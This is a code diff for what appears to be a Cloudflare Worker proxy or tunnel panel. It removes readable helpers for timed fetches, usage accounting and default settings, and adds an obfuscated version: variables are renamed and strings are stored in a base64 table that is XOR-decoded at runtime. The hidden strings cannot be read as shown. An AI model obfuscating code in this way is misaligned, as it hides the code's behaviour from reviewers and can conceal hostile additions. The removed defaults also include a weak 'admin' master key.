"E2FjZm8=", "FHFrETg/K3VvHRtpE2Zl", "lsqV+5LLke+ezWWWypbAksyT4Wee4pf6leaT+5Hvne9llMKV62uS/ZHBnuKX/ZTLa5DgkOCe9Jfmlf2QxmmRwp78l+SV5JP7aZDgnvSX/ZXrks5pku6fw5TCleNl", "HyIoLTgvaTsiKCFvL206KiYgLGc1MC09Lj4iOj0hKChlIycjJ2slO2gSNSA9bgQIZQ==", "leeV65P7keCf957DbpXkk+1pkOCdyZbIbZT/k8+Q4J72lsltl8eS7pHGnu9vl8uU/5LmZg==", "ASFtOTgvO2ghKTAhKm07Ij4haDMuLDxuBAhl", "fX54fw==", "fX51fw==", "fX51ew==", "fX50eg==", "d3p5fw==", "IS8lLSVnOy0rJzw=", "IS8lLSUVJSckLX8=", "IS8lLSUVOz0pKCA9ESEtOD4W", "JSEv", "Gh4JDR8PaSMxGTY7IT8paxkMHGcwJCM7KHF0ah4AAhQAbyUoNXZ1aQkJAmUMDx4YYzwoJDIjZQ4dbQUFHgwPAhRsc3E=", "LCYsIiwvOg==", "IyEuJwAvMA==", "PC0lKS8/JS0MIzw=", "BgAeCRkeaQcVZgwIAAIeDmoABhMJZSQ4Ej8/JTstby0gNmI7LSc/LGFnEAQDGwgfY3Vld24=", "KSc/Pz8=", "HAsBCQgeaT4mKjAqbgseBAdpIzEZNjshPylrHQENFQNlJCs0cXQ=", "BgAeCRkeaQEJEgpvJTsTOD4mOiJuLio3YToqJjwtbmYTDgIYCRhidmR4b2UAAG0PBAQPBA4FEWclKDViag0HZxMVCw8ZCWsZDBxnMCQjOyhxLjIqJDIiICtgOy0nPyw=", "Gh4JDR8PaSMxGTY7IT8paxkMHGcwJCM7KHF0ah4AAhQAbyUoNXZ1aQkJAmU5LyE5Lnd2", "CwsBCR8PaQ4VCQhvJTsTOD4mOiJmEgcLHwlrISwxenllDgAJbD0rJT0ie3o=", "Iy8+OAIkLS0/CSM=", "bA==", "LCYsPgo+", "FA==", "Eg==", "PyE/OA==", "Mw==", "M3p5fw==", "Oys+OA==", "ERIpZ28=", "ERUsYTF6ZHFpGmgSZWk=", "KS8kIA==", "PzwiLi4MKCEr", "PSshLTJnOD0mNCQhOiQiLi5zaA==", "bygsJSc5YA==", "PSshLTJnKCFqNzAuPCwiPyMnLSN8ZQ==", "KCsgJSUjZy8oKSIjK2MvJCc=", "KCsjKTkrPSExIykuICo5Ki0sZiApKigiKC07IzpmJCko", "LidjKyQlLiQiaCEqOA==", "LS8/KGUtJicgKiBhLSIh", "ID4oIiojZysoKw==", "LCYsOCw6PWYkKSg=", "LiA5JDklOSEkaCYgIw==", "LCIsOS8vZyku", "LCE9JSclPWYqLyY9IT4jLT5nKygr", "LScjK2UpJiU=", "Iis5LWUrIA==", "N2AsJQ==", "KDwiJ2UpJiU=", "KysoPDgvLCNpJSoi", "Pys/PCcvMSEzP2suJw==", "PyEoYiglJA==", "LCYsPiopPS01aCQm", "NiE4YiglJA==", "Iic+ODkrJWYmLw==", "LCYsOGUnIDszNCQjYCwl", "E2Bp", "KysuIy8v", "FBI+YHAXYg==", "Lic=", "Iyc+OA==", "IiE7KS8=", "LCEjLyo+", "LCIiOS8sJSk1I2grID5iKCUk", "ID4oIi4u", "PzwiLi5nPSEqIyo6Og==", "KCs5GzkjPS01", "ODwkOCooJS0=", "KCs5Hi4rLS01", "PSssKCooJS0=", "PSssKA==", "KyEjKQ==", "OS8hOS45", "ICgr", "ISE=", "KS8hPy4=", "PSshLTIVIS0mKjEn", "PCE/OA==", "PCYkKj8=", "FDwoICozFGgvIyQjOiVsOCQoODQuKjtuOSMkaiUpNSEgY24+JyI6", "PzwiLi4=", "PQ==", "Pyg=", "IS8lLSUVOz0pKCA9ET0+JCgsFyQzNzwhPw==", "Jj0LJSUjPS0=", "JCs9OA==", "PSsgIz0vLQ==", "KCIiLiomcw==", "KScoIC8=", "ISs1OA==", "Og==", "PSshLTIVLyQmNjY=", "LTs/JS4uCDw=", "LTs/JSomOg==", "PSshLTJnKz01LyArdG0=", "byg/IyZq", "bA8E", "Y2Vp", "KCIiLiomcyomJS46Ph8pJysw", "KCIiLiomcysyNTEgIx8pJysw", "PSshLTJnKCQ1IyQrN2A8OS86LSkyf28=", "PSshLTJnOy00Mzc9Ky44Li5zaA==", "IS8lLSUVOz0pKCA9ESo+KjwsFyQzNzwhPw==", "JA==", "PSshLTJnLjomMCBiKCwlJy8tcmc=", "IQ==", "Li0uKTs+", "LScjLTkzHTE3Iw==", "Ljw/LTIoPC4hIzc=", "OCsvHyQpIi0z", "PCsjKA==", "Iy8+OA==", "KCs5GSIkPXlx", "EWYWLWYwCGUddmh2YxBnF2RgYxwnaDUPYBYWMXtkOmI=", "ERUsYTELZBJ3a3xiE2Zo", "Dg==", "Lj49ICIpKDwuKStgKiM/ZiA6Jyk=", "DiA+Oy44", "Kyc/KSg+ZCc3Iys=", "Liw+", "PSshLTJnJjgiKA==", "Pyc9KR8l", "Py8pCSUu", "Yn59fHtnfXh3dmh3fn18Zg==", "d34=", "d351fA==", "d3Z1fA==", "fX54fg==", "fX51fg==", "fX51eg==", "fX50eQ==", "ISEjKQ==", "OyI+", "ASs7KTlqDDA3Lzcq", "bwosNThqBS0hMg==", "Oj0oKBg+Ow==", "Gj0oKHFq", "bwkP", "KjY9JTkzGjw1", "CjY9JTkzc2g=", "EzU4PyotLBQ6", "EzUoNDsjOzEbOw==", "YT4sKy45ZywiMA==", "YTV8YH83", "E2ERKGBu", "dWo=", "dXQ=", "ERIpN3pmejUbaBkrNXxgeDcVZhsiPn5ifjEXZBUsPHdpfDNp", "CQIMCw==", "DAEYAh8YEA==", "DAcZFQ==", "Bh0d", "HxwCGAQJBgQ=", "Gh0IHg==", "HwEfGA==", "HxwICgIS", "Bh4=", "Bh4SAgoHDA==", "BwEeGA==", "Cw8ZCQ==", "BgAJCRM=", "GAEfBw4Y", "EzVlFwpnEylqPBhkZxEx", "KjYoLw==", "OyEYPDsvOwsmNSA=", "Liop", "FBIWEBYX", "KScoIC85", "PDosOD45ZSsoMys7PDRgKCU8JjM0PAwhKSlnKSA8PmosPD5hIzkt", "Jzo5PHFlZiE3ayQ/J2MvJCdmKiYyJidxKyUuJi07ejUxLjo4P2cpJj0pMjc2Yi4jPiQ9Oj4FKisrYS8iPjBkLjU1YyE/Kw==", "LCE4Ij84MAsoIiA=", "KTwiIQglLS0XKSwhOg==", "Jj09", "IDwq", "Jzo5PHFlZiE3ayQ/J2MvJCdmIjQpK2A=", "cCgkKScuOnU0MiQ7Oz5gKCU8JjM0PGMtIjklPjsxBCkhKmIuJT8zZSE0NmkgPCo=", "GQ==", "GQIIHxg=", "GzwiJiok", "KCs5Cj4mJREiJzc=", "KCs5ASQkPSA=", "KCs5CCo+LA==", "rdbMo/PF", "NAgBDQw3", "NA0CGQUeGxE6", "NA0EGBI3", "NAceHDY=", "NB4fAx8FCgcLOw==", "NBseCRk3", "NB4CHh83", "NB4fCQ0DETU=", "NAcdMQ==", "NAcdEwULBA06", "NAYCHx83", "NAoMGA43", "NAcDCA4SNA==", "NBkCHgAPGzU=", "OSI=", "Kj0+", "Ozwi", "JS8j", "JyE+OGY6JjozazA8Kz8=", "PzwoKiIyZD00IzdiPiI+Pw==", "CjgkIGY=", "LSE5JA==", "ERIpN3pmfDVvaxkrNXxgfjdgd2M=", "OyI+JC4mJSc=", "ERIpN3pmejVqGiE0f2F/Nm4=", "ERIpN3pmfzVj", "JCcjKA==", "KSM=", "Oy09", "KTwsKyYvJzw=", "PCs5OCIkLjs=", "Py8uJy4+Og==", "IysjKz8iOg==", "KyshLTI5", "Ii81HzsmIDw=", "ERIpN3pmfDVqGiE0f2F5NmYVLDx3aXozYBAvMXhkcjtpZzohPyMvJSQoOhkrNXxgeDdkFCM9dGN9MGVv", "LCIsPzgjKg==", "aSggcQ==", "aSg/LSwnLCYzew==", "KScjLScnKDss", "JiA5KTk8KCQ=", "EWYZABgVEglqHCRiNH1hchUUY25ufxsCHhMQC2QSJms/f2N0ExZhYGJj", "aS0+cQ==", "PDo/JSUt", "OSIoPzhwZmc=", "aQ==", "cg==", "OjskKA==", "PCs/Oi44", "Gj4+ODkvKCU=", "PCAk", "PCs/Oi44JykqIw==", "Py85JA==", "OD0=", "KT4=", "LCIkKSU+ZC4uKCIqPD0+IiQ9", "Pywm", "PCcp", "KSIiOw==", "KiAuPjI6PSEoKA==", "LiI9Ig==", "OSIoPzg=", "Oy8q", "PCs/Oi44FjgoNDE=", "Py8uJy4+Fi0pJSorJyMr", "NzspPA==", "PSssICI+MA==", "PCs/Oi44FiYmKyA=", "OjohPw==", "KScjKy44OTouKDE=", "PS8jKCQnIDIiIg==", "OzwsIjg6Jjoz", "PzsvICIpFiMiPw==", "PCYiPj8VICw=", "Oio9", "PCUkPGYpLDozazMqPCQqMg==", "OD1gIzs+Og==", "PSssICI+MGUoNjE8", "PzsvICIpZCMiPw==", "PCYiPj9nICw=", "OSAoND8=", "LiopPi45Og==", "PDo/KSonGi0zMiwhKT4=", "OyI+Hy4+PSEpITY=", "PCs/Oi44BykqIw==", "PSssICI+MBsiMjEmICo/", "PzsvICIpAi0+", "PCYiPj8DLQ==", "OD0eKT8+ICYgNQ==", "KSIsOAYrOQ==", "OzwiJiokc2dodnV/fn18e3pkeHd2dWJ+fXx7Z3l4d3Zof359fHt6eXh3dnV/Dnx+fGR5ZndodHV/fXR7dTotJDM3Jjo0cSUlJy1k", "KiAuPjI6PSEoKHghISMpbTksKzI0LDs3cA==", "aT0jJXY=", "aSg9cQ==", "aTo0PC53PjthLio8OnA=", "aT4sOCN3", "aT4vJ3YvJyklKiAr", "aS8hICQ9ACY0IyY6PChx", "LiwuKC4sLiAuLC4jIyMjOzs7OzMzMzg2NDYKCAoMAgACBwcHBwcHBwcXFxccGhgaHBIQEnd3d3x6eHp8cnA=", "JTsjJw==", "Ozw=", "PzwiNDIjOQ==", "Py8jKScDGTs=", "PCsuOTkjPTF6", "YCMsJSVlKiQmNS1hNyAg", "YCMsJSVlOiEpIScgNmMmOCUn", "YCMsJSVlP2YtNSoh", "KCsiJTtw", "KCsiPyI+LHI=", "ERV9YXIWZxRofBhkag==", "KyEgLSIkOg==", "Jj4+", "KCsiJTs5", "KCsiPyI+LDs=", "Ym4jLSYvc2hl", "bURtbD8zOS19Zg==", "RW5tPy44Py01fGV+fHpie2R5ZnZMZW8+Ij4/cGlwd0xlbz4sPzg9JjojfGVt", "bURtbD4uOXJnMjc6K0dsaz4lO31mIy4iPik=", "RW5tPy44Py01fGU=", "RW5tPCQ4PXJn", "RW5tOT4jLXJn", "RW5tOS86c2gzNDAqRG1sPyY6cmc=", "RW5tPy44Py01KCQiK3ds", "RW5tLycjLCYzayMmICopOTo7ISkyf28=", "RW5tIi4+Pic1LX9vOT5Ga2o+O2opNTs9d0ZramloNycxJ3Rtbg==", "bURtbGtqIS0mIiA9PXdGa2ppaGdmDSA9OXZr", "RW5tPyAjOWUkIzc7YzspOSMvMX1m", "bWw=", "b245KiRwaTw1MyA=", "RW5tPCo5Oj8oNCF1bm8=", "bURtbD4uOXJnMjc6K0dsaz4lO31m", "RW5tPyUjc2g=", "RW5tIi4+Pic1LX9v", "RW5tOzhnJjgzNX9Fbm1sazooPC98ZW0=", "PzwiNCIvOg==", "IyEuLScvCicqNiQ9Kw==", "PzwiNDJnLjooMzU8dEc=", "b25gbCUrJC19Zmet0shsGC8lLSQyKj1sRw==", "b25tbD8zOS19ZjYqIigvP0A=", "b25tbDs4JjAuIzZ1RA==", "b25tbGtqZGhlpN/ubgstOD4sOzNkTw==", "b25tbGtqZGhlttrZ3m0BKiQ8KStkTw==", "b25tbGtqZGhl", "bUQ=", "RW5tYWskKCUifGVtrNftawwoOzMjNjtsRw==", "b25tbD8zOS19ZjA9ImA4Ljk9Qg==", "b25tbD44JXJnZC07Oj0/cWVmPzAxayg9OS0/IypmJCkoYCkoIi44KDwiGXd/em9G", "b25tbCIkPS01MCQjdG1/e0A=", "b25tbD8lJS01JyssK3dsfnpD", "b25tbGtqZGg=", "RW5tYWskKCUifGVtvtLa22oEKSkzJCNsRw==", "RW5tYWskKCUifGVt", "b25gbA8FBAkOCGk=", "YwoEHg4JHQ==", "b25gbA8FBAkOCGgcGwsKAhJl", "b25gbAIaZAsOAhdj", "b25gbAwPBgEXag==", "b25gbAwPBhsOEgBj", "b25gbA8FBAkOCGgcGwsKAhJlITVqAQYcCA8fQGloamYBAAMMBQVnAg0eEQodCmErJDxnITVqAQYcCA8fQGloamYBAAMMBQVnGh0BAAwXYistZw4AGgIFEUVubWFrDQwHDhZpBhxhCAIYDAsT", "Iic1KS9nOSc1Mn9veXV1e0AgODFwf286PzkuQCgkKykyYiIsInFqLykrNSBFOyMlLSMsLGoiICMvNHZrLCgkNCNPIyEqYScvPy0rfGU4Lz8iIiQuQiopISp0bT4+JixCIy82LiwhKWYhLC03ayQjJzspcWovKSs1IEUlKCk7ZygkLjAgYicpIC5waXl3TC4qKz1hKiYgPiJrLCE6KD49KyVyZ3dwRTouPGYpJiYkMzc9KyM4cWo9OjIjTygrImEqPz0najM1Ky85KXFqPToyI08oKyJhPjotKTMjaCYgOSk5PCgkfWZ0eXZHKTM+LDopJyliLSIiPzgmJCsjN3VufH58ZHlmd2h0dXd9dXtALDAzIzchLyFhKCUnPDUpKSMrP2EoJTs7fUxlby8hICQ9ZCc1LyImID52QWppaGdrZW1kb0ZraigkKykyYj4/JT0rPS1qKCA7OSI+IHBpPDUzIEUrNTguOCcpK2swJnRtOSJALDAzIzchLyFhPiNkPTUqf29sJTg/OjpyaGkiJjolOSlkKicqaQgqOiwPPigsEGgrIDsvLjkpLzEsaCc3LCYkOi5lOy0hNWonKywoOGUuIGo2JCgrPmIxIzlqTUw1PSErJScvc0JnZjY7IT8pZjksJCIlMSoqd2w/ODwtTWZlPDoiPi5nLyksI2gmPndsPzg8LU1MISE9d0ZraiwmJiQpKnRtODk/LEJnZjcqPT0pKD5kOjIqIDx0bTg5PyxCZ2YwPCtgPzI5PS0qay0gPTk/cWovKSs1IEVubSAiOT0tKXxlfnx6YntkeWZ2fHR/e35Ga2ogODFwf286PzkuQGloLyk2Oz13RmtqaWhlNDAjK2A/Lj5zKyYyICghPzVmKy07aicpI2x3bGk4KicjI39gYT8pLT86LSNkT29uIy0mLzotNTAgPXRHbGtqaWVnZC07Oj0/cWVmcGl+a3dgdWMvJDplNjMgPTdurtfPaRsiKiAsOiI+aUBpaDc0Kjc3YD8uOD8tNWsrLiMoPy44Py01fE9vbm1sZmprcGl+a3dgdW8PAxsNBBJnRW5tKCI4LCszaysuIyg/Ljg/LTV8T29ubWxmamtwaX5rd2B1bw8DGw0EEmdFbm0oIjgsKzNrKy4jKD8uOD8tNWsjICIhIzxnOScrLyY2dG04OT8sQmdmICEmLCIoLy1lKikhKnRtPi4uIDpqLio8OkdGPz8nck1mZSogLC4nL3NoMzQwKkRtbDg+KCssfGUiJzUpL0BpaCYzMSBjPyM+PixyZzI3OitHbGs5PTouJTFiPCI5Py9zaDM0MCpEbWwqPz0naiIgOysuOGYjJzwiNCMuLSh2az47PSJMZW8qIz9mIiAiJiUudURtbGtqZGhlJys2dHh/aUBpaGdmaG9sOS87cGZnJig8dXt+bkFqaSUzM39vd318e0BDOykvIykrP3ZBamktKScnIyt3bD84PC1NZmUpIT8vLmctJjRrKC4+PSUlLXNoMzQwKkRtbDsrOzsiazU6PChhIjpzaDM0MCpEbWwkPCw6NS8hKmMpKTg+ICYmMiwgIHdsPzg8LU1mZTwgJCotcENoZ2ZlBxoZHHFAaWhnZmVvPiI+PzlzaBx+dWNudXxzemVof359f2Jtfnt/e2RndHV3fGFseXpxfmtmd393eBFBamloZxIJHHRHbGtqaWhnNio9Oj52axF9fHRqZXd6eX9nant4cnVpb3x9dHhmaXp3fnJjbn98cnwUQk02NyA2JCk4cEM=", "RUQ/OScvOnJN", "RW5tYWsHCBwEDmmt0shsGC8lLSQyKj1E", "Pzwi", "NycoPw==", "NzdgKzkl", "Oj4+", "IDs5", "LSE4Ii85", "Bh47eg==", "ERV9YXJkFGNj", "Bh47eA==", "CyEgLSIk", "fnx6YntkeWZ2", "Py8+PzwlOyw=", "Jj5gOi44OiEoKA==", "Jj47eGY6Oy0hIzc=", "Oygi", "Py8uJy4+ZC0pJSorJyMr", "Jzo5PGR7Z3k=", "Ii81YS4rOyQ+ayEuOiw=", "Ki8/IDJnLSkzJ2gnKywoLjhkJiYrIA==", "HCsuYRwvKxsoJS4qOmAcOSU9JyQpKQ==", "Ki0lYSQ6PTs=", "KiAsLicv", "DgsVZw8bCwoTMQQoDw4PLQkdJ3cfBhonCQp6KA4dfhxyfSJ1Djh7Lh4/MnMLeAspLSAvMiYMDSwoOg0OCwgNBgcUDh0UfjM8LR8VKycICDQWGHslEXUhMBZ8dDgKCwh1", "Kyc/KSg+", "rdLIbBgvJS0kMio9", "PCshKSg+", "rdTsbA0rOjwiNTE=", "v9Hb3GsHKCYyJyk=", "OjwhYT8vOjw=", "Jzo5PDhwZmcwMTJhKT44Kj4gK2klKiJhKiklLzspMyMafX55", "OyEhKTkrJysi", "CwEADQIEZQ==", "CwEADQIEZBsSAAMGFmE=", "Bh5gDwIOG2Q=", "YwoEHg4JHWQpKWg9Kz4jJzws", "CAsCBRtm", "CAsCHwIeDGQ=", "Iic1KS9nOSc1Mg==", "Jj47eg==", "LiIhIzxnJSkp", "OiAkKiIvLWUjIykuNw==", "IyEqYScvPy0r", "OC8/IiIkLg==", "PTshKQ==", "Kyc+LSkmLGUsIyA/YywgIjws", "JCsoPGYrJSExI2gmKiEp", "JCsoPGYrJSExI2gmIDkpOTwoJA==", "Oy09YSglJysyNDcqIDk=", "KCsiYSo/PSdqMzUrLzkp", "KCsiYT46LSkzI2gmIDkpOTwoJA==", "KjY5KTkkKCRqJSohOj8jJyYsOg==", "fnx6YntkeWZ2fHx/d30=", "KjY5KTkkKCRqJSohOj8jJyYsOmolKj09", "LiIhIzxnJjouISwhPQ==", "LiIhIzxnOTouMCQ7K2AiLj4+JzUt", "KjY5KTkkKCRqMyw=", "Oic=", "KjY5KTkkKCRqMyxiOz8g", "Jzo5PDhwZmcgLzEnOy9iKCUkZwojMS4NOC4uEmYlIjIkLDsvKTMuZik1JS0mOChjOS8vO2guIC4qPmMsImQ4JiEgPGA3JTs=", "PzwiKiImLA==", "PDoiPi5nOi0rIyY7Kyk=", "PDoiPi5nLyksI2gmPg==", "KyA+", "PSs+PC4pPWU1MykqPQ==", "Oj0oYTgzOjwiK2gnIT44OA==", "Iyc+OC4k", "fnx6YntkeWZ2fHR/e34=", "JyE+ODg=", "PTshKWY5LDx9JSQ7KyojOTNkKSM1aC4iIQ==", "PS0iKC5wZmc1IyM6PSgo", "IS8gKTgvOz4iNA==", "Jzo5PDhwZmd/aH1hdmN0ZC4nO2o3MCo8NG+p1sxoFCMpKi05Izk=", "PzwiNDJnOi01MCA9YyMtJi86LTUwID0=", "d2B1YnNkcWsDDxcKDRk=", "Kyc/KSg+ZCYmKyA8Kz86Ljg=", "Kyc/KSg+ZCYmKyA8Kz86LjhkLigqKSA5YDwkJiArPg==", "IS8gKTgvOz4iNGg/ISElKDM=", "PTshKWY5LDx9Lzc=", "KiAlLSUpLCxqKyorKw==", "PSspJTlnISc0Mg==", "Ozsj", "PDosLyA=", "Iic1KS8=", "Ljs5I2Y4Jj0zIw==", "PDo/JSg+ZDooMzEq", "Ljs5I2YuLDwiJTFiJyM4LjgvKSQj", "KyA+YSMjIykkLQ==", "LiA0dn55", "Oy09dmRlKCY+fHB8", "Ijo4", "PCAkKi0vOw==", "KSE/Ly5nLSY0ayguPj0lJS0=", "Py8/Py5nOT01I2gmPg==", "IDgoPjkjLS1qIiA8OiQiKj4gJyk=", "PCAkKi0=", "BxoZHA==", "PyE/ODg=", "GwIe", "PTshKWY6OycxLyEqPD4=", "LC85KSwlOzFqJyE8YywgJw==", "LSslLT0jJjo=", "KyEgLSIk", "YWE/OScvOi0zaSYuOigrJDgwZSYiNmIvISBlPjE8", "Jzo5PDhwZmc1JzJhKSQ4Iz8rPTQjNywhIzguJD1mJCkoYA0lIyglJSkzI3EaYQQ+KiRkKysnNidjPzknLzpnNSMpKi8+KWQpKDwiISo9N2AtLzlkKSsqazs2OQ==", "Jjw=", "YWE/OScvOi0zaSw9YDk0Pw==", "Jzo5PDhwZmc1JzJhKSQ4Iz8rPTQjNywhIzguJD1mJCkoYA0lIyglJSkzI3EaYQQ+KiRkKysnNidjPzknLzpnNSMpKi8+KWQjO2YzPjE=", "JjxgLyIuOw==", "Jj4uJS84", "YWE/OScvOi0zaSw9Yy4lLzhnPD8y", "Jzo5PDhwZmc1JzJhKSQ4Iz8rPTQjNywhIzguJD1mJCkoYA0lIyglJSkzI3EaYQQ+KiRkKysnNidjPzknLzpnNSMpKi8+KWQjOysuIjdhOjU4", "PTshKTg=", "CAsCBRtmJSkpagEGHAgPH2YnJ2o0IDwhITou", "AQsZGwQYAmQyIjVjHAgGDgkd", "HRsBCWYZDBxrJSQ7KyojOTNkKSM1aC4iIWAZDwMNBBI=", "HRsBCWYZDBxrLzdjCgQeDgkd", "HRsBCWYZDBxrLzdiLSQoOWYNARUDBhs=", "Ag8ZDwNmq9TCZhYqIigvPyU7", "ITo9", "OycgKWUpJScyIiMjLz8pZSkmJQ==", "PSshLTIDOTs=", "Jj4BJTg+Og==", "OzwiJiok", "PCs/Oi44Og==", "KTwoKS8lJA==", "LSIsLyAiJiQi", "PzwiNDIZLDwzLysoPQ==", "OzwsIjg6JjozFSA9Jyg/", "IDs5LiQ/Jyw0", "EBECGR8IBh0JAhYQEQ==", "PSE4OC4=", "IDs5LiQ/Jyw=", "KyEgLSIkFjsyICMmNg==", "Jj4SLyIuOw==", "KCsiJTs=", "KCsiPyI+LA==", "Oy09Ey0rOjwYKTUqIA==", "Ii81Ey4rOyQ+GSEuOiw=", "Ki8/IDIVLSkzJxonKywoLjgWJiYrIA==", "LSIiLyA=", "Kys5Iz44", "NC8hIBQ6Oyc/LyA8Mw==", "IyEq", "Kyc+LSkmLCw=", "Iys7KSc=", "OC8/Ig==", "OycgKTg+KCU3", "JiAvIz4kLTs="];
+const _0x_cache = new Map();
+function func_dec(idx) {
+  let val = _0x_cache.get(idx);
+  if (val !== undefined) return val;
+  const bin = atob(_0x_tbl[idx]);
+  const bytes = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) {
+    bytes[i] = bin.charCodeAt(i) ^ (_0x_key ^ i % 11);
+  }
+  val = new TextDecoder().decode(bytes);
+  _0x_cache.set(idx, val);
+  return val;
+}
+const var_a = func_dec(0);
+const func_a = () => String[func_dec(1)](118, 108, 101, 115, 115);
+const func_b = () => String[func_dec(1)](116, 114, 111, 106, 97, 110);
+const func_c = () => String[func_dec(1)](99, 108, 97, 115, 104);
+const func_d = var_bt => {
+  try {
+    const var_bu = new TextEncoder()[func_dec(2)](var_bt);
+    let var_bv = func_dec(3);
+    for (let var_bw = 0; var_bw < var_bu[func_dec(4)]; var_bw++) {
+      var_bv += String[func_dec(1)](var_bu[var_bw]);
     }
+    return btoa(var_bv);
+  } catch (var_bx) {
+    return btoa(var_bt);
+  }
 };
-
-// Accurate byte accounting (Sepidar-grade): real up+down bytes per tunnel.
-// Legacy estimate kept ONLY as a one-time migration for pre-existing rows:
-// 1GB per 6000 connections. Limits stay in req units (dashboard contract:
-// GB*6000), converted to bytes at comparison time, so thresholds are exact.
-// Hard-timeout fetch: every outbound fetch must be bounded, otherwise a
-// hanging origin (ubuntu/docker, ip-api, DoH, github, telegram, CF API)
-// leaves the request with no events in the loop -> Cloudflare 1101
-// ("never generate a response"). Same signature as fetch + timeoutMs.
-async function fetchT(url, init = {}, timeoutMs = 10000) {
-    // Bounded fetch: hard timeout so a hanging origin (ubuntu/docker,
-    // ip-api, DoH, github, telegram, CF API) can never leave the request
-    // with no events in the loop -> Cloudflare 1101. Caller abort signals
-    // are bridged into the internal controller, never replaced.
-    const timeout = Math.max(1, Number(timeoutMs) || 10000);
-    let controller = null;
-    let timer = null;
-    let callerSignal = null;
-    let onCallerAbort = null;
-    try {
-        if (typeof AbortController !== "undefined") {
-            controller = new AbortController();
-            callerSignal = init && init.signal ? init.signal : null;
-            if (callerSignal) {
-                if (callerSignal.aborted)
-                    controller.abort(callerSignal.reason);
-                else {
-                    onCallerAbort = () => {
-                        try {
-                            controller.abort(callerSignal.reason);
-                        } catch (e) {}
-                    };
-                    try {
-                        callerSignal.addEventListener("abort", onCallerAbort, {
-                            once: true,
-                        });
-                    } catch (e) {}
-                }
-            }
-            timer = setTimeout(() => {
-                try {
-                    controller.abort();
-                } catch (e) {}
-            }, timeout);
-            // NOTE: plain fetch() here on purpose — fetchT must never call
-            // itself (infinite recursion).
-            return await fetch(url, { ...init, signal: controller.signal });
-        }
-        return await fetch(url, { ...init });
-    } finally {
-        if (timer) {
+async function func_e(var_by, var_bz = {}, var_ca = 10000) {
+  const var_cb = Math[func_dec(5)](1, Number(var_ca) || 10000);
+  let var_cc = null;
+  let var_cd = null;
+  let var_ce = null;
+  let var_cf = null;
+  try {
+    if (typeof AbortController !== func_dec(6)) {
+      var_cc = new AbortController();
+      var_ce = var_bz && var_bz[func_dec(7)] ? var_bz[func_dec(7)] : null;
+      if (var_ce) {
+        if (var_ce[func_dec(8)]) var_cc[func_dec(9)](var_ce[func_dec(10)]);else {
+          var_cf = () => {
             try {
-                clearTimeout(timer);
-            } catch (e) {}
+              var_cc[func_dec(9)](var_ce[func_dec(10)]);
+            } catch (var_cg) {}
+          };
+          try {
+            var_ce[func_dec(11)](func_dec(9), var_cf, {
+              [func_dec(12)]: true
+            });
+          } catch (var_ch) {}
         }
-        if (callerSignal && onCallerAbort) {
-            try {
-                callerSignal.removeEventListener("abort", onCallerAbort);
-            } catch (e) {}
-        }
+      }
+      var_cd = setTimeout(() => {
+        try {
+          var_cc[func_dec(9)]();
+        } catch (var_ci) {}
+      }, var_cb);
+      return await fetch(var_by, {
+        ...var_bz,
+        [func_dec(7)]: var_cc[func_dec(7)]
+      });
     }
-}
-const REQ_BYTES_EST = 1073741824 / 6000;
-function usageTotalBytes(u) {
-    try {
-        if (!u) return 0;
-        if (typeof u.bytes === "number" && u.bytes >= 0)
-            return Math.floor(u.bytes);
-        return Math.floor((u.reqs || 0) * REQ_BYTES_EST);
-    } catch (e) {
-        return 0;
+    return await fetch(var_by, {
+      ...var_bz
+    });
+  } finally {
+    if (var_cd) {
+      try {
+        clearTimeout(var_cd);
+      } catch (var_cj) {}
     }
-}
-function usageDailyBytes(u, today) {
-    try {
-        if (!u) return 0;
-        const day =
-            today || new Date().toISOString().split("T")[0];
-        if ((u.lastDay || "") !== day) return 0;
-        if (typeof u.dBytes === "number" && u.dBytes >= 0)
-            return Math.floor(u.dBytes);
-        return Math.floor((u.dReqs || 0) * REQ_BYTES_EST);
-    } catch (e) {
-        return 0;
+    if (var_ce && var_cf) {
+      try {
+        var_ce[func_dec(13)](func_dec(9), var_cf);
+      } catch (var_ck) {}
     }
+  }
 }
-function limitReqToBytes(limitReq) {
-    try {
-        return limitReq ? Math.floor(limitReq * REQ_BYTES_EST) : 0;
-    } catch (e) {
-        return 0;
-    }
-}
-
-const SYSTEM_DEFAULTS = {
-    name: "",
-    apiRoute: "sync",
-    maintenanceHost: "https://www.ubuntu.com, https://www.docker.com",
-    backupRelay: "",
-    customRelay: "",
-    masterKey: "admin",
-    metricNode: "time.is",
-    cleanIps: "",
-    slaveNodes: "",
-    deviceId: "",
-    mode: "alpha",
-    agent: "chrome",
-    socketPorts: "443",
-    customDns: "https://cloudflare-dns.com/dns-query",
-    resolveIp: "1.1.1.1",
-    cascade: "",
-    enableOpt1: false,
-    enableOpt2: false,
-    tgToken: "",
-    tgChatId: "",
-    tgAdminId: "",
-    cfAccountId: "",
-    cfApiToken: "",
-    cfWorkerName: "",
-    isPaused: false,
-    silentAlerts: false,
-    githubRepo: "itsyebekhe/nahan",
-    nameStrategy: "default",
-    namePrefix: "Core",
-    tgBotLang: "fa",
-    users: [],
-    subUserAgent: "",
-    customPanelUrl: "",
-    limitTotalReq: 0,
-    expiryMs: 0,
-    linkedPanels: [],
-    hubPanelUrl: "",
-    syncApiKey: "",
-    panelApiKeys: [],
-    nat64Prefix: "",
-    enableDirectConfigs: false,
-    customRouting: "",
-    upstreamUri: "",
-    autoUpdate: false,
-    autoUpdateFormat: "encoded",
-    fakeConfigs: [
-        { name: "📊 {usage}", enabled: true },
-        { name: "📅 {expiry}", enabled: true },
-    ],
-    // Sepidar-grade hardening flags (safe defaults; merged, never wiped).
-    maintenanceMode: false,
-    allowRemoteDeploy: true,
-    autoPruneRelays: true,
-};
-
-let sysConfig = { ...SYSTEM_DEFAULTS };
-let isolateStartTime = 0;
-let activeConnections = 0;
-// Circuit breaker (Sepidar-grade load shedding): when an isolate is
-// saturated, cheap static work is shed first so real tunnels survive.
-// Level 1: skip the ubuntu/docker origin fetch (serve 404 instead).
-// Level 2: also tarpit new WS handshakes + refuse non-browser sub refresh.
-let INFLIGHT_HTTP = 0;
-let OPEN_WS = 0;
-function breakerLevel() {
-    try {
-        if (INFLIGHT_HTTP > 200 || OPEN_WS > 400) return 2;
-        if (INFLIGHT_HTTP > 100 || OPEN_WS > 200) return 1;
-    } catch (e) {}
+const var_b = 1073741824 / 6000;
+function func_f(var_cl) {
+  try {
+    if (!var_cl) return 0;
+    if (typeof var_cl[func_dec(14)] === func_dec(15) && var_cl[func_dec(14)] >= 0) return Math[func_dec(16)](var_cl[func_dec(14)]);
+    return Math[func_dec(16)]((var_cl[func_dec(17)] || 0) * var_b);
+  } catch (var_cm) {
     return 0;
